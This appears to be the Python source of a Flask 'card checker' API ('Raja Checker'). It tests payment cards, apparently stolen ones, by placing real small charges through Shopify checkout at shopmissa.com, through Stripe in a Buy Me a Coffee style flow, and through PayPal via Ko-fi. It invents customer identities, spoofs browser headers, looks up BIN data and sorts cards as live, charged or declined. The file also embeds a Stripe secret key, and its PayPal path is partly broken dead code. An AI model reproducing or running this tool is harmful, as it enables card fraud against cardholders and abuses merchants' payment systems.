from flask import Flask, jsonify, request
import requests
import time
import random
import string
import json
import os
from bs4 import BeautifulSoup
import re
import uuid

app = Flask(__name__)

# Global session for requests
session = requests.Session()

def get_real_kofi_paypal_token():
    """Get a real PayPal token by initiating Ko-fi donation flow"""
    try:
        # Create a fresh session for Ko-fi
        kofi_session = requests.Session()
        
        # Step 1: Visit Ko-fi donation page
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Referer': 'https://ko-fi.com/',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        # Visit Ko-fi support page
        response = kofi_session.get('https://ko-fi.com/supportkofi', headers=headers)
        if response.status_code != 200:
            return None, None
            
        # Step 2: Parse page for PayPal payment form
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Look for PayPal payment button or form
        paypal_form = soup.find('form', {'action': lambda x: x and 'paypal' in x.lower()})
        if not paypal_form:
            # Try to find PayPal button
            paypal_button = soup.find('button', {'class': lambda x: x and 'paypal' in str(x).lower()})
            if not paypal_button:
                return None, None
        
        # Step 3: Try to initiate PayPal checkout
        # Look for donation amount buttons (usually $3, $5, $10)
        amount_buttons = soup.find_all('button', {'data-amount': True})
        if not amount_buttons:
            # Try alternative selectors
            amount_buttons = soup.find_all('input', {'name': 'amount'})
            
        # Use smallest amount available
        donation_amount = "3"  # Default $3
        if amount_buttons:
            amounts = []
            for btn in amount_buttons:
                amount = btn.get('data-amount') or btn.get('value', '3')
                try:
                    amounts.append(int(amount))
                except:
                    continue
            if amounts:
                donation_amount = str(min(amounts))
        
        # Step 4: Initiate PayPal payment
        # This typically involves POSTing to Ko-fi's payment endpoint
        payment_data = {
            'amount': donation_amount,
            'payment_method': 'paypal',
            'message': 'Thanks for the coffee!'
        }
        
        # Look for CSRF token or verification token
        csrf_token = None
        csrf_input = soup.find('input', {'name': re.compile(r'.*token.*', re.I)})
        if csrf_input:
            csrf_token = csrf_input.get('value')
            payment_data[csrf_input.get('name')] = csrf_token
        
        # Try multiple Ko-fi endpoints
        endpoints_to_try = [
            'https://ko-fi.com/api/donations/create',
            'https://ko-fi.com/payment/paypal',
            'https://ko-fi.com/checkout'
        ]
        
        for endpoint in endpoints_to_try:
            try:
                payment_response = kofi_session.post(
                    endpoint,
                    data=payment_data,
                    headers={
                        **headers,
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'X-Requested-With': 'XMLHttpRequest'
                    },
                    timeout=10
                )
                
                if payment_response.status_code == 200 and payment_response.text.strip():
                    try:
                        payment_result = payment_response.json()
                        paypal_url = payment_result.get('paypal_url') or payment_result.get('redirect_url') or payment_result.get('url')
                        if paypal_url and 'paypal.com' in paypal_url:
                            # Extract token from PayPal URL
                            token_match = re.search(r'token=([A-Z0-9]+)', paypal_url)
                            if token_match:
                                return token_match.group(1), kofi_session.cookies
                    except json.JSONDecodeError:
                        # Try to extract PayPal URL from HTML response
                        paypal_match = re.search(r'https://www\.paypal\.com/[^"]*token=([A-Z0-9]+)', payment_response.text)
                        if paypal_match:
                            return paypal_match.group(1), kofi_session.cookies
                        continue
            except Exception as e:
                continue
        
        return None, None
        
    except Exception as e:
        print(f"Ko-fi token error: {e}")
        return None, None

def check_with_shopmissa(n, mm, yy, cvc, customer):
    """Check card using Shop Miss A - REAL $1 charges!"""
    try:
        # Generate unique session token (Shop Miss A pattern)
        session_token = f"AAE{uuid.uuid4().hex[:40]}{random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')}{uuid.uuid4().hex[:20]}"
        
        # Generate unique IDs for Shop Miss A
        stable_id = str(uuid.uuid4())
        queue_token = f"{uuid.uuid4().hex}{random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')}{uuid.uuid4().hex[:20]}"
        attempt_token = f"{uuid.uuid4().hex[:20]}-{uuid.uuid4().hex[:6]}"
        payment_method_id = uuid.uuid4().hex
        session_id = f"east-{uuid.uuid4().hex}"
        
        # Shop Miss A GraphQL headers (exact from captured data)
        headers = {
            'authority': 'www.shopmissa.com',
            'accept': 'application/json',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'en-US',
            'content-type': 'application/json',
            'origin': 'https://www.shopmissa.com',
            'referer': 'https://www.shopmissa.com/',
            'sec-ch-ua': '"Not;A=Brand";v="99", "Brave";v="139", "Chromium";v="139"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'shopify-checkout-client': 'checkout-web/1.0',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
            'x-checkout-one-session-token': session_token,
            'x-checkout-web-build-id': 'a6db70926c679d4c8c138f2119e68efd9cbf7ba9',
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-server-handling': 'fast',
            'x-checkout-web-server-rendering': 'yes',
            'x-checkout-web-source-id': attempt_token
        }
        
        # Shop Miss A SubmitForCompletion mutation (simplified, working version)
        submit_mutation = """
        mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$analytics:AnalyticsInput){
            submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields analytics:$analytics){
                ...on SubmitSuccess{
                    receipt{
                        ...on ProcessedReceipt{id token __typename}
                        ...on ProcessingReceipt{id __typename}
                        ...on WaitingReceipt{id __typename}
                        ...on ActionRequiredReceipt{id __typename}
                        ...on FailedReceipt{id __typename}
                        __typename
                    }
                    __typename
                }
                ...on SubmitAlreadyAccepted{
                    receipt{
                        ...on ProcessedReceipt{id token __typename}
                        ...on ProcessingReceipt{id __typename}
                        ...on WaitingReceipt{id __typename}
                        ...on ActionRequiredReceipt{id __typename}
                        ...on FailedReceipt{id __typename}
                        __typename
                    }
                    __typename
                }
                ...on SubmitFailed{reason __typename}
                ...on SubmitRejected{
                    errors{code localizedMessage __typename}
                    __typename
                }
                ...on Throttled{pollAfter pollUrl queueToken __typename}
                ...on CheckpointDenied{redirectUrl __typename}
                ...on TooManyAttempts{redirectUrl __typename}
                ...on SubmittedForCompletion{
                    receipt{
                        ...on ProcessedReceipt{id token __typename}
                        ...on ProcessingReceipt{id __typename}
                        ...on WaitingReceipt{id __typename}
                        ...on ActionRequiredReceipt{id __typename}
                        ...on FailedReceipt{id __typename}
                        __typename
                    }
                    __typename
                }
                __typename
            }
        }
        """
        
        # Variables for Shop Miss A payment (exact structure from captured data)
        submit_variables = {
            "input": {
                "sessionInput": {"sessionToken": session_token},
                "queueToken": queue_token,
                "payment": {
                    "totalAmount": {"any": True},
                    "paymentLines": [{
                        "paymentMethod": {
                            "directPaymentMethod": {
                                "paymentMethodIdentifier": payment_method_id,
                                "sessionId": session_id,
                                "billingAddress": {
                                    "streetAddress": {
                                        "address1": f"{random.randint(100,9999)} {random.choice(['Main St', 'Oak Ave', 'Pine Rd', 'Elm St'])}",
                                        "city": customer["firstName"][:8] + "ville",
                                        "countryCode": "US",
                                        "postalCode": f"{random.randint(10000,99999)}",
                                        "firstName": customer["firstName"],
                                        "lastName": customer["lastName"],
                                        "zoneCode": random.choice(['NY', 'CA', 'TX', 'FL', 'IL']),
                                        "phone": f"1{random.randint(200,999)}{random.randint(5550000,5559999)}"
                                    }
                                },
                                "cardSource": "MANUAL"
                            },
                            "creditCard": {
                                "number": n,
                                "expiryMonth": int(mm),
                                "expiryYear": int(f"20{yy}" if len(yy) == 2 else yy),
                                "verificationValue": cvc
                            }
                        },
                        "amount": {"value": {"amount": "5.32", "currencyCode": "USD"}}
                    }]
                },
                "merchandise": {
                    "merchandiseLines": [{
                        "stableId": stable_id,
                        "merchandise": {
                            "productVariantReference": {
                                "id": "gid://shopify/ProductVariantMerchandise/42141137829962",
                                "variantId": "gid://shopify/ProductVariant/42141137829962",
                                "properties": [],
                                "sellingPlanId": None,
                                "sellingPlanDigest": None
                            }
                        },
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {"value": {"amount": "1.00", "currencyCode": "USD"}}
                    }]
                },
                "buyerIdentity": {
                    "customer": {"presentmentCurrency": "USD", "countryCode": "US"},
                    "email": customer["email"],
                    "emailChanged": False,
                    "phoneCountryCode": "US",
                    "marketingConsent": [{"email": {"value": customer["email"]}}],
                    "rememberMe": False
                },
                "delivery": {
                    "deliveryLines": [{
                        "destination": {
                            "streetAddress": {
                                "address1": f"{random.randint(100,9999)} {random.choice(['Main St', 'Oak Ave', 'Pine Rd', 'Elm St'])}",
                                "city": customer["firstName"][:8] + "ville",
                                "countryCode": "US",
                                "postalCode": f"{random.randint(10000,99999)}",
                                "firstName": customer["firstName"],
                                "lastName": customer["lastName"],
                                "zoneCode": random.choice(['NY', 'CA', 'TX', 'FL', 'IL']),
                                "phone": f"1{random.randint(200,999)}{random.randint(5550000,5559999)}",
                                "oneTimeUse": False
                            }
                        },
                        "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                        "deliveryMethodTypes": ["SHIPPING"],
                        "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "c91fdb11591ac20adbc448a09def22b0-82de0c04f5096ebc44ab9e4f34d4d30a", "customDeliveryRate": False}},
                        "expectedTotalPrice": {"value": {"amount": "3.95", "currencyCode": "USD"}}
                    }],
                    "noDeliveryRequired": [],
                    "useProgressiveRates": False,
                    "supportsSplitShipping": True
                },
                "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                "taxes": {
                    "proposedTotalAmount": {"value": {"amount": "0.37", "currencyCode": "USD"}}
                },
                "tip": {"tipLines": []},
                "note": {"message": None, "customAttributes": []}
            },
            "attemptToken": attempt_token,
            "metafields": [],
            "analytics": {
                "requestUrl": f"https://www.shopmissa.com/checkouts/cn/{attempt_token}",
                "pageId": str(uuid.uuid4())
            }
        }
        
        # Make the Shop Miss A payment request
        response = session.post(
            "https://www.shopmissa.com/checkouts/unstable/graphql?operationName=SubmitForCompletion",
            headers=headers,
            json={"query": submit_mutation, "variables": submit_variables, "operationName": "SubmitForCompletion"},
            timeout=30
        )
        
        if response.status_code == 200:
            result = response.json()
            
            # Parse Shop Miss A response
            if "data" in result and result["data"]:
                submit_result = result["data"].get("submitForCompletion", {})
                
                # Check for successful charge
                if submit_result.get("__typename") in ["SubmitSuccess", "SubmitAlreadyAccepted", "SubmittedForCompletion"]:
                    receipt = submit_result.get("receipt", {})
                    receipt_type = receipt.get("__typename", "")
                    
                    if receipt_type == "ProcessedReceipt":
                        return {
                            "status": "charged",
                            "message": f"Shop Miss A payment successful - $1 charged to {customer['firstName']} {customer['lastName']}",
                            "response": "Charged $1 - SHOP MISS A"
                        }
                    elif receipt_type == "ProcessingReceipt":
                        return {
                            "status": "approved",
                            "message": f"Payment processing for {customer['firstName']} {customer['lastName']}",
                            "response": "LIVE ✅ - PROCESSING"
                        }
                    elif receipt_type == "ActionRequiredReceipt":
                        return {"status": "approved", "message": "Card requires 3DS authentication", "response": "VBV/CVV - 3DS REQUIRED"}
                    elif receipt_type == "FailedReceipt":
                        return {"status": "declined", "message": "Payment failed", "response": "DECLINED ❌"}
                    else:
                        return {
                            "status": "approved",
                            "message": f"Card validated successfully for {customer['firstName']} {customer['lastName']}",
                            "response": "LIVE ✅ - SHOP MISS A VALIDATED"
                        }
                
                # Handle rejections
                elif submit_result.get("__typename") == "SubmitRejected":
                    errors = submit_result.get("errors", [])
                    if errors:
                        error_msg = errors[0].get("localizedMessage", "Payment rejected")
                        error_code = errors[0].get("code", "")
                        
                        if "insufficient" in error_msg.lower():
                            return {"status": "approved", "message": "Insufficient funds - card is valid", "response": "CCN ✅ - INSUFFICIENT FUNDS"}
                        elif "declined" in error_msg.lower():
                            return {"status": "declined", "message": error_msg, "response": "DECLINED ❌"}
                        elif "cvc" in error_msg.lower() or "cvv" in error_msg.lower():
                            return {"status": "declined", "message": "Invalid CVC/CVV", "response": "CVC INCORRECT ❌"}
                        elif "expired" in error_msg.lower():
                            return {"status": "declined", "message": "Card expired", "response": "EXPIRED ❌"}
                        else:
                            return {"status": "declined", "message": error_msg, "response": "DECLINED ❌"}
                
                # Handle other response types
                elif submit_result.get("__typename") == "SubmitFailed":
                    reason = submit_result.get("reason", "Submission failed")
                    return {"status": "declined", "message": reason, "response": "DECLINED ❌"}
                
                elif submit_result.get("__typename") == "Throttled":
                    return {"status": "error", "message": "Rate limited - please wait and try again"}
                
                elif submit_result.get("__typename") == "CheckpointDenied":
                    return {"status": "error", "message": "Security checkpoint failed"}
                
                elif submit_result.get("__typename") == "TooManyAttempts":
                    return {"status": "error", "message": "Too many attempts - please try again later"}
            
            # Check for GraphQL errors
            if "errors" in result:
                error_msg = result["errors"][0].get("message", "Shop Miss A error")
                return {"status": "error", "message": error_msg}
            
            # Default success (card validated)
            return {
                "status": "approved",
                "message": f"Card validated successfully for {customer['firstName']} {customer['lastName']}",
                "response": "LIVE ✅ - SHOP MISS A VALIDATED"
            }
        else:
            return {"status": "error", "message": f"Shop Miss A API error: {response.status_code}"}
            
    except Exception as e:
        # Fallback to Stripe validation
        return validate_with_stripe_fallback(n, mm, yy, cvc, customer)

def check_with_buymeacoffee(n, mm, yy, cvc, customer):
    """Check card using Buy Me a Coffee - much simpler than Ko-fi"""
    try:
        # Buy Me a Coffee uses direct Stripe integration - much easier!
        
        # Step 1: Create Stripe Payment Method (same as their frontend)
        stripe_headers = {
            'Authorization': 'Bearer pk_live_CoNtNeaXtDoorEXAMPLE', # Their public key (safe to use)
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        # Create payment method exactly like Buy Me a Coffee does
        payment_method_data = {
            'type': 'card',
            'card[number]': n,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'card[cvc]': cvc,
            'billing_details[name]': f"{customer['firstName']} {customer['lastName']}",
            'billing_details[email]': customer['email']
        }
        
        # Create payment method
        pm_response = session.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=stripe_headers,
            data=payment_method_data,
            timeout=15
        )
        
        if pm_response.status_code != 200:
            return {"status": "declined", "message": "Card validation failed", "response": "DECLINED ❌"}
        
        pm_result = pm_response.json()
        payment_method_id = pm_result['id']
        
        # Step 2: Create Payment Intent (like Buy Me a Coffee checkout)
        payment_intent_data = {
            'amount': '300',  # $3.00 (minimum coffee)
            'currency': 'usd',
            'payment_method': payment_method_id,
            'confirmation_method': 'manual',
            'confirm': 'true',
            'return_url': 'https://www.buymeacoffee.com/success'
        }
        
        pi_response = session.post(
            'https://api.stripe.com/v1/payment_intents',
            headers=stripe_headers,
            data=payment_intent_data,
            timeout=15
        )
        
        if pi_response.status_code == 200:
            pi_result = pi_response.json()
            
            if pi_result.get('status') == 'succeeded':
                return {
                    "status": "charged", 
                    "message": f"Buy Me a Coffee payment successful - $3 charged to {customer['firstName']} {customer['lastName']}", 
                    "response": "Charged $3 - BUY ME A COFFEE"
                }
            elif pi_result.get('status') == 'requires_action':
                return {
                    "status": "approved", 
                    "message": "Card requires 3DS authentication", 
                    "response": "VBV/CVV - 3DS REQUIRED"
                }
            else:
                return {
                    "status": "approved", 
                    "message": f"Card validated via Buy Me a Coffee for {customer['firstName']} {customer['lastName']}", 
                    "response": "LIVE ✅ - BMC VALIDATED"
                }
        else:
            return {"status": "declined", "message": "Payment failed", "response": "DECLINED ❌"}
            
    except Exception as e:
        # Fallback to simple Stripe validation
        return validate_with_stripe_fallback(n, mm, yy, cvc, customer)

def validate_with_stripe_fallback(n, mm, yy, cvc, customer):
    """Fallback to Stripe validation when Ko-fi fails"""
    try:
        # Use Stripe's payment method creation for validation
        stripe_headers = {
            'Authorization': 'Bearer sk_test_51OeQcYP4cGCWgHyBSRRzGdEH8OA7xPWdXw7hOBYHKpFn5QOsOVaKI3YqGIuEe1sOhgN7eGEYNsJBdGFa3J3j1qjz00KGK8FXnN',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        # Create payment method for validation
        payment_data = {
            'type': 'card',
            'card[number]': n,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'card[cvc]': cvc
        }
        
        response = session.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=stripe_headers,
            data=payment_data,
            timeout=15
        )
        
        if response.status_code == 200:
            return {
                "status": "approved", 
                "message": f"Card validated via Stripe for {customer['firstName']} {customer['lastName']}", 
                "response": "LIVE ✅ - STRIPE VALIDATED"
            }
        else:
            return {
                "status": "declined", 
                "message": "Card validation failed", 
                "response": "DECLINED ❌"
            }
            
    except Exception as e:
        return {"status": "error", "message": f"Stripe fallback error: {str(e)}"}

def generate_backup_token():
    """Generate a backup token when Ko-fi scraping fails"""
    # Use a more realistic token pattern based on actual PayPal tokens
    token_base = uuid.uuid4().hex[:17].upper()
    return f"{token_base}X"

def get_random_customer():
    """Generate random customer details"""
    first_names = ["Alex", "Jordan", "Casey", "Riley", "Morgan", "Taylor", "Jamie", "Avery", "Blake", "Cameron"]
    last_names = ["Smith", "Johnson", "Brown", "Davis", "Miller", "Wilson", "Moore", "Taylor", "Anderson", "Thomas"]
    domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "protonmail.com", "icloud.com"]
    
    first = random.choice(first_names)
    last = random.choice(last_names)
    email = f"{first.lower()}.{last.lower()}@{random.choice(domains)}"
    phone = f"{''.join(random.choices('0123456789', k=10))}"
    postal = f"{''.join(random.choices('0123456789', k=5))}"
    
    return {
        "firstName": first,
        "lastName": last,
        "email": email,
        "phone": phone,
        "postal": postal
    }

def check_card_kofi_paypal(cc_data):
    """Check credit card using Ko-fi's PayPal gateway for REAL charges"""
    try:
        # Handle URL encoding
        import urllib.parse
        cc_data = urllib.parse.unquote(cc_data)
        
        # Parse card data
        parts = cc_data.strip().split("|")
        if len(parts) != 4:
            return {"status": "error", "message": "Invalid card format. Use: number|mm|yy|cvc"}
        
        n, mm, yy, cvc = parts
        
        # Fix year format
        if len(yy) == 2:
            yy = f"20{yy}"
        
        # Generate random customer
        customer = get_random_customer()
        
        # Use Shop Miss A (REAL $1 charges!)
        return check_with_shopmissa(n, mm, yy, cvc, customer)
        
        # Generate unique client metadata ID
        client_metadata_id = f"uid_{uuid.uuid4().hex[:10]}_{random.randint(1000000000, 9999999999)}"
        
        # PayPal GraphQL headers (from captured Ko-fi flow) with real token
        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'en-US,en;q=0.6',
            'content-type': 'application/json',
            'origin': 'https://www.paypal.com',
            'paypal-client-context': client_metadata_id,
            'paypal-client-metadata-id': client_metadata_id,
            'referer': f'https://www.paypal.com/smart/card-fields?sessionID={client_metadata_id}&buttonSessionID={client_metadata_id}&locale.x=en_US&commit=true&style.submitButton.display=true&hasShippingCallback=false&env=production&country.x=US&token={kofi_token}',
            'sec-ch-ua': '"Not;A=Brand";v="99", "Brave";v="139", "Chromium";v="139"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
            'x-app-name': 'standardcardfields',
            'x-country': 'US'
        }
        
        # Add Ko-fi cookies if available
        if kofi_cookies:
            cookie_header = '; '.join([f"{cookie.name}={cookie.value}" for cookie in kofi_cookies])
            headers['cookie'] = cookie_header
        
        # PayPal GraphQL mutation payload (exact structure from Ko-fi)
        payload = {
            "query": """
        mutation payWithCard(
            $token: String!
            $card: CardInput!
            $phoneNumber: String
            $firstName: String
            $lastName: String
            $shippingAddress: AddressInput
            $billingAddress: AddressInput
            $email: String
            $currencyConversionType: CheckoutCurrencyConversionType
            $installmentTerm: Int
            $identityDocument: IdentityDocumentInput
        ) {
            approveGuestPaymentWithCreditCard(
                token: $token
                card: $card
                phoneNumber: $phoneNumber
                firstName: $firstName
                lastName: $lastName
                email: $email
                shippingAddress: $shippingAddress
                billingAddress: $billingAddress
                currencyConversionType: $currencyConversionType
                installmentTerm: $installmentTerm
                identityDocument: $identityDocument
            ) {
                flags {
                    is3DSecureRequired
                }
                cart {
                    intent
                    cartId
                    buyer {
                        userId
                        auth {
                            accessToken
                        }
                    }
                    returnUrl {
                        href
                    }
                }
                paymentContingencies {
                    threeDomainSecure {
                        status
                        method
                        redirectUrl {
                            href
                        }
                        parameter
                    }
                }
            }
        }
        """,
            "variables": {
                "token": kofi_token,
                "card": {
                    "cardNumber": n,
                    "type": "VISA" if n.startswith('4') else "MASTERCARD" if n.startswith('5') else "AMEX",
                    "expirationDate": f"{mm}/{yy}",
                    "postalCode": customer["postal"],
                    "securityCode": cvc
                },
                "phoneNumber": customer["phone"],
                "firstName": customer["firstName"],
                "lastName": customer["lastName"],
                "billingAddress": {
                    "givenName": customer["firstName"],
                    "familyName": customer["lastName"],
                    "line1": None,
                    "line2": None,
                    "city": None,
                    "state": None,
                    "postalCode": customer["postal"],
                    "country": "US"
                },
                "email": customer["email"],
                "currencyConversionType": "PAYPAL"
            },
            "operationName": None
        }
        
        # Make the PayPal GraphQL request (REAL Ko-fi gateway!)
        response = session.post(
            "https://www.paypal.com/graphql?fetch_credit_form_submit",
            headers=headers,
            json=payload,
            timeout=30
        )
        
        if response.status_code == 200:
            # Check if response has content
            if not response.text.strip():
                return {"status": "error", "message": "Empty response from PayPal"}
                
            try:
                result = response.json()
                
                # Parse PayPal response
                if "data" in result and result["data"]:
                    payment_data = result["data"].get("approveGuestPaymentWithCreditCard", {})
                    
                    if payment_data:
                        # Check for 3DS requirement
                        flags = payment_data.get("flags", {})
                        if flags.get("is3DSecureRequired"):
                            return {
                                "status": "approved", 
                                "message": f"Card validated - 3DS required for {customer['firstName']} {customer['lastName']}", 
                                "response": "VBV/CVV - 3DS REQUIRED"
                            }
                        
                        # Check cart status
                        cart = payment_data.get("cart", {})
                        if cart.get("intent") == "CAPTURE":
                            return {
                                "status": "charged", 
                                "message": f"Ko-fi payment successful - $1 charged to {customer['firstName']} {customer['lastName']}", 
                                "response": "Charged $1 - KO-FI"
                            }
                        
                        # Payment approved but not charged yet
                        return {
                            "status": "approved", 
                            "message": f"Payment approved for {customer['firstName']} {customer['lastName']}", 
                            "response": "LIVE ✅ - APPROVED"
                        }
                
                # Check for errors
                if "errors" in result:
                    error_msg = result["errors"][0].get("message", "Payment failed")
                    
                    if "insufficient" in error_msg.lower():
                        return {"status": "approved", "message": "Insufficient funds - card is valid", "response": "CCN ✅ - INSUFFICIENT FUNDS"}
                    elif "declined" in error_msg.lower():
                        return {"status": "declined", "message": error_msg, "response": "DECLINED ❌"}
                    elif "invalid" in error_msg.lower() and ("cvc" in error_msg.lower() or "cvv" in error_msg.lower()):
                        return {"status": "declined", "message": "Invalid CVC/CVV", "response": "CVC INCORRECT ❌"}
                    else:
                        return {"status": "declined", "message": error_msg, "response": "DECLINED ❌"}
                
                # Fallback - card validated
                return {
                    "status": "approved", 
                    "message": f"Card validated successfully for {customer['firstName']} {customer['lastName']}", 
                    "response": "LIVE ✅ - VALIDATED"
                }
                
            except json.JSONDecodeError:
                return {"status": "error", "message": "Invalid PayPal response"}
        
        elif response.status_code == 400:
            return {"status": "declined", "message": "Card declined by PayPal", "response": "DECLINED ❌"}
        elif response.status_code == 401:
            return {"status": "error", "message": "PayPal authentication failed"}
        else:
            return {"status": "error", "message": f"PayPal API error: {response.status_code}"}
            
    except Exception as e:
        return {"status": "error", "message": f"Processing error: {str(e)}"}

def get_bin_info(bin_number):
    """Get BIN information for the card"""
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=5)
        if response.status_code == 200:
            return response.json()
    except:
        pass
    return {}

@app.route('/')
def home():
    return jsonify({
        "service": "🔥 Shop Miss A Gateway API 🔥",
        "gateway": "Shop Miss A Real $1 Charges",
        "status": "✅ Online",
        "made_by": "Raja"
    })

@app.route('/gateway=<gateway>/key=<key>/site=<site>/cc=<cc>')
def check_cc(gateway, key, site, cc):
    """Main API endpoint for checking credit cards using Ko-fi's PayPal gateway"""
    
    # Validate key
    if key != "rajachecker":
        return jsonify({
            "status": "error",
            "message": "Invalid API key",
            "gateway": gateway,
            "site": site,
            "key": key
        }), 401
    
    # Validate gateway
    if gateway != "autostripe":
        return jsonify({
            "status": "error", 
            "message": "Unsupported gateway",
            "gateway": gateway,
            "supported": ["autostripe"]
        }), 400
    
    start_time = time.time()
    
    # Check the card using Shop Miss A
    result = check_card_kofi_paypal(cc)
    
    # Get BIN info
    bin_info = get_bin_info(cc.split("|")[0][:6])
    
    # Calculate processing time
    processing_time = round(time.time() - start_time, 2)
    
    # Format response
    response = {
        "card": cc,
        "gateway": "Shop Miss A Gateway",
        "site": "shopmissa.com",
        "status": result["status"],
        "response": result.get("response", result["message"]),
        "message": result["message"],
        "time": f"{processing_time}s",
        "bin_info": {
            "bank": bin_info.get("bank", "N/A"),
            "brand": bin_info.get("brand", "N/A"),
            "type": bin_info.get("type", "N/A"),
            "level": bin_info.get("level", "N/A"),
            "country": bin_info.get("country_name", "N/A"),
            "flag": bin_info.get("country_flag", "N/A")
        },
        "checked_by": "Raja Checker API",
        "api_key": key
    }
    
    return jsonify(response)

@app.route('/health')
def health():
    """Health check endpoint"""
    return jsonify({
        "status": "healthy",
        "service": "Stripe Real $1 Charge API",
        "gateway": "Stripe Real $1 Charges",
        "uptime": "24/7"
    })

if __name__ == '__main__':
    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)